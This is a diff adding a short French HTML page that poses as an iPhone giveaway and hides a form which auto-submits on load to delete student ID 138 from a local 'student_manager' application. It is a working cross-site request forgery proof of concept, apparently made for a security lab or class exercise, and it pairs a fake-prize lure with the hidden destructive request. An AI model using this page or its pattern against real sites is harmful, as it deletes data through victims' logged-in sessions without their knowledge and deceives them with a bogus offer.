@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Page piégée</title>
+</head>
+<body>
+  <h1>Gagne un iPhone ! 🎁</h1>
+  <p>Clique ici pour réclamer ton cadeau...</p>
+
+  <!-- Formulaire caché qui supprime l'étudiant ID 138 -->
+  <form id="csrf_form"
+        action="http://localhost/student_manager/delete.php"
+        method="GET">
+    <input type="hidden" name="id" value="138">
+  </form>
+
+  <!-- Le formulaire se soumet automatiquement -->
+  <script>
+    document.getElementById('csrf_form').submit();
+  </script>
+</body>
+</html>
+
